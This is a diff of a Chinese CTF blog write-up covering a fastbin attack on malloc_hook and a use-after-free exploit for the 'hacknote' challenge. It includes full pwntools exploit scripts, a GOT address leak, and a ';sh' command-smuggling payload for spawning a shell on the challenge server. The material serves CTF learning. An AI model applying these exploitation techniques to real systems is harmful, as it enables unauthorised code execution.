@@ -42,8 +42,18 @@
 <meta property="og:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220925214653726.png">
 <meta property="og:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220925225058672.png">
 <meta property="og:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220925225635985.png">
+<meta property="og:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926185455460.png">
+<meta property="og:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926185557730.png">
+<meta property="og:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926193402657.png">
+<meta property="og:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926194926217.png">
+<meta property="og:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926195000594.png">
+<meta property="og:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926200527419.png">
+<meta property="og:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926193851959.png">
+<meta property="og:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926193655270.png">
+<meta property="og:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926224315090.png">
+<meta property="og:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926225030991.png">
 <meta property="article:published_time" content="2022-09-21T13:26:35.000Z">
-<meta property="article:modified_time" content="2022-09-25T14:59:06.537Z">
+<meta property="article:modified_time" content="2022-09-26T14:52:32.157Z">
 <meta property="article:author" content="springtime">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220921222427122.png">
@@ -238,7 +248,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          13k words
+          16k words
         
       </span>
     
@@ -249,7 +259,7 @@
         
         
         
-          106 mins
+          135 mins
         
       </span>
     
@@ -479,13 +489,60 @@
 <p>这时释放chunk1进入unsortedbin，再将chunk1申请回来，这时释放chunk2，unsortedbin的地址就会同时出现在chunk1与chunk2里，最后show(1)即可完成地址泄露。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x20</span>)+p8(<span class="hljs-number">0xa1</span>))<span class="hljs-comment">#offbyone</span><br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">14</span>+p64(<span class="hljs-number">0xa0</span>)+p64(<span class="hljs-number">0x21</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0xa1</span>))<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
 
-
-
 <p>操作完毕的堆布局如下：</p>
 <img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220925225635985.png" srcset="/img/loading.gif" lazyload class="" title="image-20220925225635985">
 
 <p>可以看到地址成功被泄露出来。</p>
-<h4 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h4><h3 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a>pwnable_hacknote</h3>
+<h4 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h4><p>泄露地址之后直接打fastbin即可，申请四个fast大小的堆块chunk，edit chunk4修改chunk5的size为0xe1覆盖chunk6；然后free6，再free5，然后再把unsortedbin中的chunk5申请出来，修改chunk6的fd指针为malloc-0x23，最后申请一个chunk写malloc_hook即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x68</span>+<span class="hljs-string">&#x27;\xe1&#x27;</span>) <br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;abcd&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="hljs-number">8</span>))<br></code></pre></td></tr></table></figure>
+
+<p>执行之后打印malloc_hook：</p>
+<img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926185455460.png" srcset="/img/loading.gif" lazyload class="" title="image-20220926185455460">
+
+<p>成功写入了realloc，getshell。</p>
+<img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926185557730.png" srcset="/img/loading.gif" lazyload class="" title="image-20220926185557730">
+
+<h3 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a>pwnable_hacknote</h3><p>例行检查，32位ELF，没开pie。</p>
+<img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926193402657.png" srcset="/img/loading.gif" lazyload class="" title="image-20220926193402657">
+
+<p>ida扫一遍，菜单，有增、删、查功能，限制申请堆块个数5个。</p>
+<p>申请的时候会先申请一个note块，用于存放puts函数与content的地址，注意puts的地址是其他函数返回的：</p>
+<img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926194926217.png" srcset="/img/loading.gif" lazyload class="" title="image-20220926194926217">
+
+<img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926195000594.png" srcset="/img/loading.gif" lazyload class="" title="image-20220926195000594">
+
+<p>如果我们申请一个堆块，结构是这样的：</p>
+<img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926200527419.png" srcset="/img/loading.gif" lazyload class="" title="image-20220926200527419">
+
+<p>红框内是note堆块，而下方是我们申请的堆块。note堆块里存放了puts函数的地址以及chunk的data区地址</p>
+<p>同时注意到show函数处，使用的是指针调用，ptr</p>
+<p>指向的就是note块的puts函数。</p>
+<img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926193851959.png" srcset="/img/loading.gif" lazyload class="" title="image-20220926193851959">
+
+<p>明显这里我们可以直接修改ptr的值，去调用其他函数。</p>
+<p>delete处发现free之后指针没有置空，存在UAF</p>
+<img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926193655270.png" srcset="/img/loading.gif" lazyload class="" title="image-20220926193655270">
+
+
+
+<p>结合UAF，思路就明显了。</p>
+<h4 id="泄露地址-1"><a href="#泄露地址-1" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>首先我们申请两个0x20大小的堆块chunk0与chunk1，然后释放，note和chunk会分别进入0x10与0x20的fastbin。既然note和chunk会同时进入bin，那么如果我们申请大小为0x8的chunk，前一半0x8作为note后一半0x8作为content。这时候content就会直接覆盖chunk1的note(fastbin LIFO)，这时修改chunk1的note填入puts与free_got，在申请回来执行show(1)，就可以泄露free_got的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>,p32(<span class="hljs-number">0x804862b</span>)+p32(<span class="hljs-number">0x804a018</span>)) <span class="hljs-comment">#2 func_puts + free_got</span><br>show(<span class="hljs-number">1</span>)<br>free_addr=u32(io.recv(<span class="hljs-number">4</span>))<br><br>libc_base=free_addr-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;free_got===&gt;%s\nsystem===&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(free_addr),<span class="hljs-built_in">hex</span>(system))<br></code></pre></td></tr></table></figure>
+
+<p>成功泄露</p>
+<img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926224315090.png" srcset="/img/loading.gif" lazyload class="" title="image-20220926224315090">
+
+<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>同样的方法，我们将note中的put换成system，然后使用管道符 || sh 或者分隔符 ; sh 来使得程序执行下一步sh。</p>
+<p>至于为什么不能是system(“&#x2F;bin&#x2F;sh”)，那是因为system的参数是固定为system的地址，即固定执行system(system_addr)，因此我们加入 管道符或者分号会忽略上一步的错误命令继续执行下一条。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># from LibcSearcher import *</span><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>l64     = <span class="hljs-keyword">lambda</span>                    :u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>l32     = <span class="hljs-keyword">lambda</span>                    :u32(io.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>s       = <span class="hljs-keyword">lambda</span> data               :io.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :io.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>	gdb.attach(io)<br>	raw_input()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">i</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,i)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>	choice(<span class="hljs-number">1</span>)<br>	sla(<span class="hljs-string">&#x27;size :&#x27;</span>,size)<br>	sla(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>	choice(<span class="hljs-number">3</span>)<br>	sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,index)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>	choice(<span class="hljs-number">2</span>)<br>	sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,index)<br><br><span class="hljs-comment"># io=process(&quot;./hacknote&quot;)</span><br>io=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26410</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23-32.so&#x27;</span>)<br><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>,p32(<span class="hljs-number">0x804862b</span>)+p32(<span class="hljs-number">0x804a018</span>)) <span class="hljs-comment">#2 func_puts + free_got</span><br>show(<span class="hljs-number">1</span>)<br>free_addr=u32(io.recv(<span class="hljs-number">4</span>))<br><br>libc_base=free_addr-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;free_got===&gt;%s\nsystem===&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(free_addr),<span class="hljs-built_in">hex</span>(system))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">libc = LibcSearcher(&quot;free&quot;, free_addr)</span><br><span class="hljs-string">libc_base=free_addr-libc.dump(&quot;free&quot;)</span><br><span class="hljs-string">system = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">offset=libc.sym[&#x27;system&#x27;]-libc.sym[&#x27;free&#x27;] # got offset</span><br><span class="hljs-string">system=free_addr+offset</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x8</span>,p32(system)+<span class="hljs-string">b&quot;;sh&quot;</span>)<br><span class="hljs-comment"># gdb.attach(io,&quot;b *&#123;&#125;&quot;.format(hex(system)))</span><br><span class="hljs-comment"># p()</span><br>show(<span class="hljs-number">1</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926225030991.png" srcset="/img/loading.gif" lazyload class="" title="image-20220926225030991">
+
+<p>注：我在本地调试是打不通的，因为我的ubuntu是64位而程序是32位，所以地址差异的原因打不通。</p>
+
                 
               </div>
             
